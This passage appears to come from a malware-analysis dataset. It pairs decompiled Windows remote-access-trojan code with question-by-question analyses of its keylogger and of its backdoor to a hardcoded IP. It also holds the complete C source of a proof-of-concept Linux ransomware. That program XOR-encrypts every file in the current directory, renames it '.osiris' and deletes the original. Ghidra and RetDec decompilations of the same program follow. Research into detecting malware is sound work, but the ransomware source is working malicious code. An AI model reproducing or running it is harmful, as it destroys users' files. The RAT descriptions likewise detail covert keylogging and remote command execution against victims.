v2 = v7 + 1;
goto lab_0x4049e6;
}
case 9: {
// 0x4049e3
v2 = v7 + 1;
goto lab_0x4049e6;
}
default: {
goto lab_0x4049f1;
}
}
}
lab_0x4049f1:;
char v9 = v8; // 0x4049f3
int32_t v10 = v7; // 0x4049f3
int32_t v11 = v7; // 0x4049f3
int32_t v12; // 0x4049b0
if (v8 != 34) {
while (true) {
lab_0x404a07:
// 0x404a07
v12 = v10;
switch (v9) {
case 32: {
goto lab_0x404a13_2;
}
case 9: {
goto lab_0x404a13_2;
}
case 0: {
goto lab_0x404a13_2;
}
default: {
int32_t v13 = v10 + 1; // 0x404a04
v9 = *(char *)v13;
v10 = v13;
goto lab_0x404a07;
}
}
}
} else {
int32_t v14; // 0x4049b0
int32_t v15; // 0x404a68
char v16; // 0x404a6b
while (true) {
lab_0x404a66:
// 0x404a66
v14 = v11;
v15 = v14 + 1;
v16 = *(char )v15;
v11 = v15;
switch (v16) {
case 34: {
goto lab_0x404a72;
}
case 0: {
goto lab_0x404a72;
}
default: {
goto lab_0x404a66;
}
}
}
lab_0x404a72:
// 0x404a72
v12 = v16 != 34 ? v15 : v14 + 2;
}
lab_0x404a13_2:;
int32_t v17 = v12; // 0x4049b0
while (true) {
lab_0x404a13:;
int32_t v18 = v17;
v3 = v18;
switch ((char *)v18) {
case 32: {
// 0x404a10
v17 = v18 + 1;
goto lab_0x404a13;
}
case 9: {
// 0x404a10
v17 = v18 + 1;
goto lab_0x404a13;
}
default: {
goto lab_0x404a1e;
}
}
}
int32_t v19 = v3;
uint16_t v20; // 0x4049b0
unsigned char v21; // 0x4049b0
v4 = v21 % 2 == 0 ? 10 : (int32_t)v20;
moduleHandle = GetModuleHandleA(NULL);
return _WinMain_40_16((int32_t)moduleHandle, 0, v19, v4);
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 8","1. The primary functionality of the code is to act as a remote access trojan. It allows a remote attacker to execute commands, manage files, registry keys, and establish a keylogger to monitor and transmit keyboard inputs from the infected machine to the attacker.

2. `make_me_crazy()`: Initiates a keylogger on the host system that logs keystrokes and stores them in temporary buffers.
`oh_boy_what_does_this_do()`: Serves as the main loop for handling incoming commands via established connection and executing them.
`LowLevelKeyboardProc()`: A low-level keyboard procedure used by the keylogger to record keystrokes and handle them accordingly.

3. `ghHook`: A handle to the low-level keyboard hook. It is used by the keylogger function `LowLevelKeyboardProc()` to monitor keyboard events, record keystrokes, and execute associated logging actions.

4. The error handling mechanism consists of returning a `-1` when an error occurs, and in some cases, sending an error message back to the attacker. For instance, `make_me_crazy()` returns `-1` and `oh_boy_what_does_this_do()` sends ""Failed\n"" to the socket if commands cannot be executed.

5. Flow of execution in `oh_boy_what_does_this_do()`: The function enters an infinite loop, receiving commands from the attacker via a socket. It checks the command's type and executes the corresponding instructions. It handles special commands like ""quit"", ""cd "", ""make_me_crazy"", and sends back responses or results through the same socket.

6. External libraries used are:
   - `winsock2.h`: For socket programming and network communications.
   - `wininet.h`: For Windows Internet functions.
   - `windows.h` and `winuser.h`: For Windows API functions including those required for keylogging and system hooks.
   - `UseTracker.h`: Custom header file, which is presumed to contain declarations related to the keylogging functionality.

7. Evident security concerns:
   - The code lacks authentication mechanisms, which can be exploited by anyone who knows the server IP and port.
   - It operates silently, persisting as a startup entry, enabling remote access and keylogging without user consent.
   - No encryption is used, so all data sent over the network, including potentially sensitive keystrokes, can be intercepted.","1. The primary functionality of this code appears to be related to file operations and command-line argument processing for a Windows application. It includes initializing the runtime environment, handling uncaught exceptions, starting up the main process, and processing directory entries.

2. Key functions:
   - `___mingw_glob`: Performs pattern matching and expands wildcard characters in command-line arguments.
   - `___mingw_opendir`: Opens a directory stream corresponding to the directory name and returns a pointer to the directory stream.
   - `_WinMain_16`: Acts as an entry point of a Windows application, invoking the primary functionality of the program.

3. `local_24`: This variable seems to hold a return value from the `___mingw_glob` function. It may indicate the success or failure of the wildcard expansion process or store the number of matched entries.

4. The error handling mechanism uses the `__errno()` function to retrieve the error code of the last operation, and it sets appropriate error codes based on the Windows API errors using `_GetLastError_0()`.

5. The code snippet related to `___mingw_opendir` involves converting the file path from a multibyte string to a wide-character string, querying the filesystem for directory entries, allocating memory to store directory information, and then handling the file entries found during this process.

6. External libraries/dependencies:
   - Standard C library functions like `malloc`, `free`, `memcpy`, etc.
   - Windows API functions used for file/directory operations, error handling, and process management (`FindFirstFileA`, `FindNextFileA`, `GetLastError`, `SetUnhandledExceptionFilter`, etc.).

7. Evident security concerns:
   - The program does not seem to check the size of buffers before performing operations such as `strcpy`, which could lead to buffer overflows.
   - There might be potential memory leaks or uninitialized memory accesses since there is dynamic memory allocation with `malloc` and `realloc` but not enough visible context on deallocation.
   - The use of `system`-level calls can be risky if the input is not properly sanitized, leading to command injection vulnerabilities.","1. The primary functionality of the code is to create a network connection to the IP address ""192.168.1.166"" and execute remote commands received over the socket. It appears to be a backdoor or remote access trojan that allows an attacker to control the infected system.

2. 
   - `_real_main`: Sets up a socket connection to a hardcoded IP address, attempting to reconnect if it fails initially, and then calls `_oh_boy_what_does_this_do` upon successful connection.
   - `_make_me_crazy`: Initializes synchronization primitives and memory resources, presumably for managing the application state or handling concurrent processes.
   - `_oh_boy_what_does_this_do`: Appears to be the core function for receiving, parsing, and executing remote commands sent to the infected machine.

3. `g13`: This global variable is used to store a socket descriptor. It is utilized for network communication in functions like `_real_main` and `_oh_boy_what_does_this_do` to send and receive data over a network.

4. Error handling is minimal and mainly focused on the network setup phase. For example, `_real_main` exits the program with status `1` if `WSAStartup` fails. If `connect` fails, it enters a loop to retry the connection indefinitely, sleeping 10ms between attempts.

5. Flow in `_real_main`:
   - Initialize Winsock.
   - Create a socket and store the descriptor in `g13`.
   - Convert the IP address to a network byte order and create a sockaddr structure.
   - Attempt to connect to the remote IP, retry if it fails, using Sleep to wait between attempts.
   - Once connected, it calls `_oh_boy_what_does_this_do`.

6. External libraries or dependencies include:
   - Windows API functions (`WSAStartup`, `socket`, `connect`, `recv`, `send`, etc.).
   - Standard libraries (`stdio.h`, `stdlib.h`, `string.h`).
   - Network libraries (`sys/socket.h`, `netinet/in.h`, `arpa/inet.h`).

7. Security concerns evident in the code include:
   - Hardcoded IP address could indicate command and control server for malware.
   - Lack of encryption in network communication.
   - Potential buffer overflows due to the use of functions like `strcpy` and `strcat`.
   - The inclusion of a mutex and event creation points to adversarial attempts to maintain uniqueness or prevent multiple instances.
   - The possibility of arbitrary command execution can result in the attacker gaining unauthorized access to system resources."
4,https://github.com/afjoseph/randomware/blob/master/randomware.c,Done,Linux,"/*
* PoC Ransomware
* Copyright (C) 2019 Abdullah Joseph (afjoseph)
/
/*******************************************************************************************************************/
#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
/ This is the new extension of a ""ransomed"" file /
#define RANSOMED_EXT "".osiris""
#define CHARSET ""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ""
#define KEY_LEN 32
#define DBG
/ Count of crypted files /
/static int Enc_Files = 0;/
/ never displayed msg */
const char *never_displayed = ""Randomware by [afjoseph]"";
void rand_str(char *dest, size_t size) {
for (size_t n = 0; n < size; n++) {
int key = rand() % (int)(sizeof CHARSET - 1);
dest[n] = CHARSET[key];
}
dest[size] = '\0';
}
void encrypt_block(uint8_t *ret_char, uint8_t char_to_xor, int counter,
const uint8_t *key, size_t len_key) {
uint8_t key_char = key[counter % len_key];
*ret_char = char_to_xor ^ key_char;
#ifdef DBG
printf(""counter = %d\n"", counter);
printf(""key_char = 0x%02x\n"", key_char);
printf(""byte_to_xor = 0x%02x\n"", char_to_xor);
printf(""ret_char = 0x%02x\n"", *ret_char);
#endif
}
int is_filename_proper(const char *filename) {
// Don't iterate over dots
if (strcmp(""."", filename) == 0 || strcmp("".."", filename) == 0) {
return 1;
}
// Don't delete yourself or already encrypted files
if (strstr(filename, ""randomware"") != 0 ||
strstr(filename, "".osiris"") != 0) {
return 1;
}
return 0;
}
void encrypt_file(const char *orig_filepath, const uint8_t *key,
size_t len_key) {
char *bname;
char *new_filepath;
int origfile_fd, newfile_fd;
struct stat st;
int i;
uint8_t *mem, *newmem;
bname = basename((char *)orig_filepath);
if (is_filename_proper(bname) != 0) {
return;
}
if ((origfile_fd = open(orig_filepath, O_RDONLY)) < 0) {
fprintf(stderr, ""[!] open failed %s\n"", orig_filepath);
return;
}
if (fstat(origfile_fd, &st) < 0) {
fprintf(stderr, ""[!] fstat failed %s\n"", orig_filepath);
return;
}
// Open new file for writing
new_filepath = strdup(orig_filepath);
strcat(new_filepath, RANSOMED_EXT);
#ifdef DBG
printf(""new filepath: %s\n"", new_filepath);
#endif
if ((newfile_fd = open(new_filepath, O_WRONLY | O_CREAT | O_TRUNC)) < 0) {
fprintf(stderr, ""[!] open failed %s\n"", new_filepath);
return;
}
fchmod(newfile_fd, st.st_mode); // Don't handle error
// Copy memory
mem = (uint8_t *)mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, origfile_fd,
0);
if (mem == MAP_FAILED) {
fprintf(stderr, ""[!] mmap failed\b"");
return;
}
newmem = (uint8_t *)alloca(st.st_size);
#ifdef DBG
printf(""\torig_filepath: %s\n"", orig_filepath);
printf(""\tsize of file %ld\n"", st.st_size);
printf(""\tfirst 4 bytes:\n"");
for (i = 0; i < 4; i++) {
printf(""\t%d: %02x\n"", i, mem[i]);
}
printf(""\tLast byte:\n"");
printf(""\t%ld: %02x\n"", st.st_size, mem[st.st_size - 2]);
printf(""\n"");
#endif
for (i = 0; i < st.st_size; i++) {
encrypt_block(&newmem[i], mem[i], i, key, len_key);
#ifdef DBG
printf(""\rprogress: %ld\r"", (i / st.st_size) * 100);
#endif
}
if ((write(newfile_fd, newmem, st.st_size)) <= 0) {
fprintf(stderr, ""[!] write failed %s"", new_filepath);
return;
}
remove(orig_filepath); // Don't handle any errors
close(newfile_fd);
close(origfile_fd);
}
int main(int argc, char **argv) {
DIR *d;
struct dirent *dir;
char *key;
key = (char *) alloca(KEY_LEN * sizeof(char));
rand_str(key, KEY_LEN);
#ifdef DBG
printf(""key is: %s\n"", key);
#endif
d = opendir(""."");
if (d) {
while ((dir = readdir(d)) != NULL) {
encrypt_file(dir->d_name, (const uint8_t *)key, KEY_LEN);
}
closedir(d);
}
}","{
""functions"": [
""rand_str"",
""encrypt_block"",
""is_filename_proper"",
""encrypt_file"",
""main""
]
}","{
""variables"": [
""never_displayed"",
""dest"",
""n"",
""key"",
""key_char"",
""ret_char"",
""char_to_xor"",
""counter"",
""len_key"",
""i"",
""orig_filepath"",
""key"",
""len_key"",
""bname"",
""new_filepath"",
""origfile_fd"",
""newfile_fd"",
""st"",
""mem"",
""newmem"",
""d"",
""dir""
]
}","/*
* PoC Ransomware
* Copyright (C) 2019 Abdullah Joseph (afjoseph)
/
/*******************************************************************************************************************/
// Header includes
/ This is the new extension of a ""ransomed"" file /
// Define the new file extension for encrypted files
#define RANSOMED_EXT "".osiris""
#define CHARSET ""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ""
#define KEY_LEN 32
#define DBG
/ Count of crypted files */
/static int Enc_Files = 0;/
// Define a constant string that is never displayed
const char *never_displayed = ""Randomware by [afjoseph]"";
// Function to generate a random string
void rand_str(char *dest, size_t size);
// Function to encrypt a single character
void encrypt_block(uint8_t *ret_char, uint8_t char_to_xor, int counter, const uint8_t *key, size_t len_key);
// Function to check if a filename is proper for encryption
int is_filename_proper(const char *filename);
// Function to encrypt a file
void encrypt_file(const char *orig_filepath, const uint8_t *key, size_t len_key);
// Function to perform cleaning of temporary files generated
void ok();
// Function to run the encryption process
void run();
// Function to pause the program
void pause();
int main(int argc, char **argv);","void encrypt_file(char *param_1,long param_2,ulong param_3);
int close(int __fd);
int fstat(int __fd,stat *__buf);
int open(char *__file,int __oflag,...);
int remove(char *__filename);
undefined8 is_filename_proper(char *param_1);
char * strstr(char *__haystack,char *__needle);
int strcmp(char *__s1,char *__s2);
int puts(char *__s);
ssize_t write(int __fd,void *__buf,size_t __n);
void * mmap(void *__addr,size_t __len,int __prot,int __flags,int __fd,__off_t __offset);
char * strdup(char *__s);
int encrypt_block(byte *param_1,byte param_2,uint param_3,long param_4,ulong param_5);
int fchmod(int __fd,__mode_t __mode);
int closedir(DIR *__dirp);
DIR * opendir(char *__name);
dirent * readdir(DIR __dirp);
void rand_str(long param_1,ulong param_2);
int rand(void);
/ WARNING: Globals starting with '_' overlap smaller symbols at the same address */
undefined8 main(void)
{
long lVar1;
DIR *__dirp;
dirent *pdVar2;
undefined auStack_60 [32];
lVar1 = __stack_chk_guard;
rand_str((long)auStack_60,0x20);
printf(""key is: %s\n"",auStack_60);
__dirp = opendir(""."");
if (__dirp != (DIR *)0x0) {
while (pdVar2 = readdir(__dirp), pdVar2 != (dirent )0x0) {
encrypt_file(pdVar2->d_name,(long)auStack_60,0x20);
}
closedir(__dirp);
}
if (lVar1 - ___stack_chk_guard == 0) {
return 0;
}
/ WARNING: Subroutine does not return /
__stack_chk_fail(&__stack_chk_guard,0,0,lVar1 - ___stack_chk_guard);
}
/ WARNING: Globals starting with '' overlap smaller symbols at the same address */
void encrypt_file(char *param_1,long param_2,ulong param_3)
{
ulong uVar1;
long lVar2;
long lVar3;
undefined *puVar4;
int iVar5;
char *pcVar6;
undefined8 uVar7;
size_t sVar8;
ssize_t sVar9;
undefined auStack_100 [16];
ulong local_d8;
long local_d0;
char *local_c8;
uint local_b4;
int local_b0;
int local_ac;
char *local_a0;
void *local_98;
undefined auStack_88 [48];
size_t local_58;
long local_8;
puVar4 = auStack_100;
local_8 = ___stack_chk_guard;
pcVar6 = __xpg_basename(param_1);
uVar7 = is_filename_proper(pcVar6);
if ((int)uVar7 == 0) {
local_b0 = open(param_1,0);
if (local_b0 < 0) {
fprintf(_stderr,""[!] open failed %s\n"",param_1);
}
else {
iVar5 = fstat(local_b0,(stat *)auStack_88);
if (iVar5 < 0) {
fprintf(_stderr,""[!] fstat failed %s\n"",param_1);
}
else {
local_a0 = strdup(param_1);
sVar8 = strlen(local_a0);
*(undefined8 *)(local_a0 + sVar8) = 0x73697269736f2e;
printf(""new filepath: %s\n"",local_a0);
local_ac = open(local_a0,0x241);
if (local_ac < 0) {
fprintf(_stderr,""[!] open failed %s\n"",local_a0);
}
else {
fchmod(local_ac,auStack_88.16_4);
local_98 = mmap((void *)0x0,local_58,1,2,local_b0,0);
if (local_98 == (void *)0xffffffffffffffff) {
fwrite(&DAT_00101658,1,0x10,_stderr);
}
else {
uVar1 = local_58 + 0xf;
for (; puVar4 != auStack_100 + -(uVar1 & 0xffffffffffff0000); puVar4 = puVar4 + -0x10000
) {
*(undefined8 *)(puVar4 + -0xfc00) = 0;
}
lVar3 = -(uVar1 & 0xfff0);
local_d8 = param_3;
local_d0 = param_2;
local_c8 = param_1;
*(undefined8 *)(puVar4 + lVar3) = 0;
if (0x3ff < (uVar1 & 0xfff0)) {
*(undefined8 )(puVar4 + lVar3 + 0x400) = 0;
}
printf(""\torig_filepath: %s\n"",local_c8);
printf(""\tsize of file %ld\n"",local_58);
puts(""\tfirst 4 bytes:"");
for (local_b4 = 0; (int)local_b4 < 4; local_b4 = local_b4 + 1) {
printf(""\t%d: %02x\n"",(ulong)local_b4,
(ulong)(byte )((long)local_98 + (long)(int)local_b4));
}
puts(""\tLast byte:"");
printf(""\t%ld: %02x\n"",local_58,(ulong)(byte *)((long)local_98 + (local_58 - 2)));
putchar(10);
for (local_b4 = 0; (long)(int)local_b4 < (long)local_58; local_b4 = local_b4 + 1) {
encrypt_block(puVar4 + lVar3 + 0x10 + (int)local_b4,
*(byte )((long)local_98 + (long)(int)local_b4),local_b4,local_d0,
local_d8);
lVar2 = 0;
if (local_58 != 0) {
lVar2 = (long)(int)local_b4 / (long)local_58;
}
printf(""\rprogress: %ld\r"",lVar2 * 100);
}
sVar9 = write(local_ac,puVar4 + lVar3 + 0x10,local_58);
if (sVar9 < 1) {
fprintf(_stderr,""[!] write failed %s"",local_a0);
}
else {
remove(local_c8);
close(local_ac);
close(local_b0);
}
}
}
}
}
}
if (local_8 - ___stack_chk_guard != 0) {
/ WARNING: Subroutine does not return */
__stack_chk_fail(&__stack_chk_guard,0,local_8 - ___stack_chk_guard);
}
return;
}

undefined8 is_filename_proper(char *param_1)
{
int iVar1;
undefined8 uVar2;
char *pcVar3;
iVar1 = strcmp(""."",param_1);
if ((iVar1 == 0) || (iVar1 = strcmp("".."",param_1), iVar1 == 0)) {
uVar2 = 1;
}
else {
pcVar3 = strstr(param_1,""randomware"");
if ((pcVar3 == (char *)0x0) && (pcVar3 = strstr(param_1,"".osiris""), pcVar3 == (char *)0x0)) {
uVar2 = 0;
}
else {
uVar2 = 1;
}
}
return uVar2;
}

int encrypt_block(byte *param_1,byte param_2,uint param_3,long param_4,ulong param_5)
{
byte bVar1;
ulong uVar2;
int iVar3;
uVar2 = 0;
if (param_5 != 0) {
uVar2 = (ulong)(long)(int)param_3 / param_5;
}
bVar1 = *(byte *)(param_4 + ((long)(int)param_3 - uVar2 * param_5));
*param_1 = param_2 ^ bVar1;
printf(""counter = %d\n"",(ulong)param_3);
printf(""key_char = 0x%02x\n"",(ulong)bVar1);
printf(""byte_to_xor = 0x%02x\n"",(ulong)param_2);
iVar3 = printf(""ret_char = 0x%02x\n"",(ulong)*param_1);
return iVar3;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <dirent.h>
#include <fcntl.h>
#include <libgen.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
// ------------------------ Structures ------------------------
struct _IO_FILE {
int32_t e0;
};
struct __dirstream {
int32_t e0;
};
struct dirent {
int32_t e0;
int32_t e1;
int16_t e2;
char e3;
char e4[256];
};
struct stat {
int32_t e0;
int32_t e1;
int32_t e2;
int32_t e3;
int32_t e4;
int32_t e5;
int32_t e6;
int32_t e7;
int32_t e8;
int32_t e9;
int32_t e10;
int32_t e11;
int32_t e12;
int32_t e13;
int32_t e14;
int32_t e15;
int32_t e16;
int32_t e17;
int32_t e18;
int32_t e19;
};
// ------------------- Function Prototypes --------------------
int64_t __do_global_dtors_aux(void);
int64_t _fini(int64_t a1);
int64_t _init(int64_t a1);
int64_t _start(int64_t a1);
int64_t call_weak_fn(void);
int64_t deregister_tm_clones(void);
int64_t encrypt_block(void);
int64_t encrypt_file(int64_t a1, int64_t a2, int64_t a3);
int64_t frame_dummy(void);
int32_t function_b90(char * s);
int32_t function_ba0(int64_t main2, int32_t argc, char ** ubp_av, void (*init)(), void (*fini)(), void (*rtld_fini)());
int32_t function_bb0(char * filename);
void function_bc0(int64_t * d);
struct __dirstream * function_bd0(char * name);
int32_t function_be0(char * file, int32_t oflag, ...);
int32_t function_bf0(int32_t fd, int32_t mode);
char * function_c00(char * path);
struct dirent * function_c10(struct __dirstream * dirp);
int32_t function_c20(void);
char * function_c30(char * s);
int32_t function_c40(struct __dirstream * dirp);
void function_c50(void);
int32_t function_c60(int32_t fd);
void function_c70(void);
int32_t function_c80(int32_t fd, int64_t * buf, int32_t n);
void function_c90(void);
int32_t function_ca0(char * s);
int32_t function_cb0(char * s1, char * s2);
int64_t * function_cc0(int64_t * addr, int32_t len, int32_t prot, int32_t flags, int32_t fd, int32_t offset);
int32_t function_cd0(int64_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s);
char * function_ce0(char * haystack, char * needle);
int32_t function_cf0(char * format, ...);
int32_t function_d00(int32_t c);
int32_t function_d10(int32_t fd, struct stat * buf);
int32_t function_d20(struct _IO_FILE * stream, char * format, ...);
int64_t is_filename_proper(void);
int64_t rand_str(void);
int64_t register_tm_clones(void);
// --------------------- Global Variables ---------------------
int64_t g1 = 0; // 0x11fe8
int64_t g2 = 0x141c; // 0x11ff0
int64_t g3 = 0; // 0x12000
int64_t g4 = 0; // 0x12018
int32_t g5 = 0x78756e69; // 0x241
int32_t g6 = 0; // 0x843
int32_t g7;
// ------- Dynamically Linked Functions Without Header --------
void __cxa_finalize(int64_t * a1);
void gmon_start(void);
int32_t __libc_start_main(int64_t a1, int32_t a2, char ** a3, void (*a4)(), void (*a5)(), void (*a6)());
void __stack_chk_fail(void);
// ------------------------ Functions -------------------------
// Address range: 0xb50 - 0xb68
int64_t _init(int64_t a1) {
// 0xb50
return call_weak_fn();
}
// Address range: 0xb90 - 0xba0
int32_t function_b90(char * s) {
// 0xb90
return strlen(s);
}
// Address range: 0xba0 - 0xbb0
int32_t function_ba0(int64_t main2, int32_t argc, char ** ubp_av, void (*init)(), void (fini)(), void (rtld_fini)()) {
// 0xba0
return __libc_start_main(main2, argc, ubp_av, init, fini, rtld_fini);
}
// Address range: 0xbb0 - 0xbc0
int32_t function_bb0(char * filename) {
// 0xbb0
return remove(filename);
}
// Address range: 0xbc0 - 0xbd0
void function_bc0(int64_t * d) {
// 0xbc0
__cxa_finalize(d);
}
// Address range: 0xbd0 - 0xbe0
struct __dirstream * function_bd0(char * name) {
// 0xbd0
return opendir(name);
}
// Address range: 0xbe0 - 0xbf0
int32_t function_be0(char * file, int32_t oflag, ...) {
// 0xbe0
return open(file, oflag);
}
// Address range: 0xbf0 - 0xc00
int32_t function_bf0(int32_t fd, int32_t mode) {
// 0xbf0
return fchmod(fd, mode);
}
// Address range: 0xc00 - 0xc10
char * function_c00(char * path) {
// 0xc00
return __xpg_basename(path);
}
// Address range: 0xc10 - 0xc20
struct dirent * function_c10(struct __dirstream * dirp) {
// 0xc10
return readdir(dirp);
}
// Address range: 0xc20 - 0xc30
int32_t function_c20(void) {
// 0xc20
return rand();
}
// Address range: 0xc30 - 0xc40
char * function_c30(char * s) {
// 0xc30
return strdup(s);
}
// Address range: 0xc40 - 0xc50
int32_t function_c40(struct __dirstream * dirp) {
// 0xc40
return closedir(dirp);
}
// Address range: 0xc50 - 0xc60
void function_c50(void) {
// 0xc50
__stack_chk_fail();
}
// Address range: 0xc60 - 0xc70
int32_t function_c60(int32_t fd) {
// 0xc60
return close(fd);
}
// Address range: 0xc70 - 0xc80
void function_c70(void) {
// 0xc70
gmon_start();
}
// Address range: 0xc80 - 0xc90
int32_t function_c80(int32_t fd, int64_t * buf, int32_t n) {
// 0xc80
return write(fd, buf, n);
}
// Address range: 0xc90 - 0xca0
void function_c90(void) {
// 0xc90
abort();
}
// Address range: 0xca0 - 0xcb0
int32_t function_ca0(char * s) {
// 0xca0
return puts(s);
}
// Address range: 0xcb0 - 0xcc0
int32_t function_cb0(char * s1, char * s2) {
// 0xcb0
return strcmp(s1, s2);
}
// Address range: 0xcc0 - 0xcd0
int64_t * function_cc0(int64_t * addr, int32_t len, int32_t prot, int32_t flags, int32_t fd, int32_t offset) {
// 0xcc0
return mmap(addr, len, prot, flags, fd, offset);
}
// Address range: 0xcd0 - 0xce0
int32_t function_cd0(int64_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s) {
// 0xcd0
return fwrite(ptr, size, n, s);
}
// Address range: 0xce0 - 0xcf0
char * function_ce0(char * haystack, char * needle) {
// 0xce0
return strstr(haystack, needle);
}
// Address range: 0xcf0 - 0xd00
int32_t function_cf0(char * format, ...) {
// 0xcf0
return printf(format);
}
// Address range: 0xd00 - 0xd10
int32_t function_d00(int32_t c) {
// 0xd00
return putchar(c);
}
// Address range: 0xd10 - 0xd20
int32_t function_d10(int32_t fd, struct stat * buf) {
// 0xd10
return fstat(fd, buf);
}
// Address range: 0xd20 - 0xd30
int32_t function_d20(struct _IO_FILE * stream, char * format, ...) {
// 0xd20
return fprintf(stream, format);
}
// Address range: 0xd40 - 0xd74
int64_t _start(int64_t a1) {
// 0xd40
int64_t v1; // 0xd40
int64_t v2; // 0xd40
__libc_start_main(g2, (int32_t)a1, (char **)&v1, NULL, NULL, (void ()())v2);
abort();
return &g7;
}
// Address range: 0xd74 - 0xd88
int64_t call_weak_fn(void) {
// 0xd74
if ((int64_t *)0x11fe0 == 0) {
// 0xd84
return 0;
}
// 0xd80
gmon_start();
return &g7;
}
// Address range: 0xd90 - 0xdc0
int64_t deregister_tm_clones(void) {
// 0xd90
return &g4;
}
// Address range: 0xdc0 - 0xdfc
int64_t register_tm_clones(void) {
// 0xdc0
return &g4;
}
// Address range: 0xe00 - 0xe48
int64_t __do_global_dtors_aux(void) {
unsigned char result = *(char )&g4; // 0xe10
if (result != 0) {
// 0xe3c
return result;
}
// 0xe18
if ((int64_t *)0x11fd0 != 0) {
// 0xe24
__cxa_finalize((int64_t )(int64_t *)((int64_t)&g3 + 8));
}
// 0xe30
deregister_tm_clones();
*(char *)&g4 = 1;
// 0xe3c
return 1;
}
// Address range: 0xe50 - 0xe54
int64_t frame_dummy(void) {
// 0xe50
return register_tm_clones();
}
// Address range: 0xe54 - 0xf04
int64_t rand_str(void) {
int64_t v1 = 0; // 0xee4
int64_t v2; // 0xe54
int64_t result; // 0xef0
if (v2 == 0) {
// 0xee8
result = 2 * v2;
*(char *)result = 0;
return result;
}
int32_t v3 = rand(); // 0xe6c
char v4 = *(char *)((int64_t)(-62 * ((v3 + (int32_t)((int64_t)v3 * (int64_t)((int32_t)&g6 & 0xffff | -0x7bdf0000) / 0x100000000) >> 5) - (v3 >> 31)) + v3) + (int64_t)""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ""); // 0xec4
*(char *)(v1 + v2) = v4;
v1++;
while (v1 != v2) {
// 0xe6c
v3 = rand();
v4 = *(char *)((int64_t)(-62 * ((v3 + (int32_t)((int64_t)v3 * (int64_t)((int32_t)&g6 & 0xffff | -0x7bdf0000) / 0x100000000) >> 5) - (v3 >> 31)) + v3) + (int64_t)""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"");
*(char *)(v1 + v2) = v4;
v1++;
}
// 0xee8
result = 2 * v2;
*(char *)result = 0;
return result;
}
// Address range: 0xf04 - 0xfbc
int64_t encrypt_block(void) {
// 0xf04
int64_t v1; // 0xf04
unsigned char v2 = *(char *)((0x100000000 * v1 >> 32) % (uint64_t)v1 + v1); // 0xf40
*(char )v1 = v2 ^ (char)v1;
printf(""counter = %d\n"", v1 & 0xffffffff);
printf(""key_char = 0x%02x\n"", (int32_t)v2);
printf(""byte_to_xor = 0x%02x\n"", (int32_t)v1 % 256);
int64_t v3; // 0xf04
return printf(""ret_char = 0x%02x\n"", (int32_t)(char *)&v3);
}
// Address range: 0xfbc - 0x1044
int64_t is_filename_proper(void) {
// 0xfbc
int64_t v1; // 0xfbc
char * str = (char *)v1; // 0xfc4
if (strcmp(""."", str) == 0 || strcmp("".."", str) == 0) {
// 0x103c
return 1;
}
// 0x1000
if (strstr(str, ""randomware"") == NULL) {
// 0x1018
return strstr(str, "".osiris"") != NULL;
}
// 0x103c
return 1;
}
// Address range: 0x1044 - 0x141c
int64_t encrypt_file(int64_t a1, int64_t a2, int64_t a3) {
char * path = (char *)a1; // 0x1074
__xpg_basename(path);
if ((int32_t)is_filename_proper() == 0) {
int32_t fd = open(path, O_RDONLY); // 0x1094
if (fd < 0) {
// 0x10a8
fprintf((struct _IO_FILE )(int64_t )(int64_t *)0x11fd8, ""[!] open failed %s\n"", path);
} else {
// 0x10cc
int64_t buf; // bp-128, 0x1044
if (fstat(fd, (struct stat *)&buf) < 0) {
// 0x10e4
fprintf((struct _IO_FILE )(int64_t )(int64_t *)0x11fd8, ""[!] fstat failed %s\n"", path);
} else {
char * str = strdup(path); // 0x110c
*(int64_t *)((int64_t)strlen(str) + (int64_t)str) = 0x73697269736f2e;
printf(""new filepath: %s\n"", str);
int32_t fd2 = open(str, (int32_t)&g5); // 0x1154
if (fd2 < 0) {
// 0x1168
fprintf((struct _IO_FILE )(int64_t )(int64_t *)0x11fd8, ""[!] open failed %s\n"", str);
} else {
// 0x118c
int32_t mode; // 0x1044
fchmod(fd2, mode);
int64_t * v1 = mmap(NULL, mode, 1, 2, fd, 0); // 0x11b8
if (v1 == (int64_t *)-1) {
int64_t stream = *(int64_t )(int64_t *)0x11fd8; // 0x11d4
fwrite((int64_t *)""[!] mmap failed\b"", 1, 16, (struct _IO_FILE *)stream);
} else {
// 0x11f4
int64_t v2; // bp-248, 0x1044
int64_t v3 = &v2; // 0x104c
int64_t v4 = mode; // 0x11f4
int64_t v5 = v4 + 15; // 0x11f8
int64_t v6 = v5 & -0x10000; // 0x1204
int64_t v7 = v3 - v6; // 0x1208
int64_t v8 = v3; // 0x1210
if (v6 != 0) {
int64_t v9 = v3 - 0x10000; // 0x1214
*(int64_t *)(v3 - 0xfc00) = 0;
int64_t v10 = v9; // 0x1210
v8 = v7;
while (v9 != v7) {
// 0x1214
v9 = v10 - 0x10000;
*(int64_t *)(v10 - 0xfc00) = 0;
v10 = v9;
v8 = v7;
}
}
int64_t v11 = v8 - (v5 & 0xfff0); // 0x1224
*(int64_t *)v11 = 0;
if ((v5 & 0xfc00) != 0) {
// 0x1238
*(int64_t )(v11 + 1024) = 0;
}
int64_t v12 = (int64_t)v1; // 0x11b8
printf(""\torig_filepath: %s\n"", path);
printf(""\tsize of file %ld\n"", mode);
puts(""\tfirst 4 bytes:"");
int64_t v13 = 0;
printf(""\t%d: %02x\n"", v13, (int32_t)(char )(v13 + v12));
int64_t v14 = v13 + 1;
while (v14 != 4) {
// 0x1288
v13 = v14;
printf(""\t%d: %02x\n"", v13, (int32_t)(char )(v13 + v12));
v14 = v13 + 1;
}
// 0x12c4
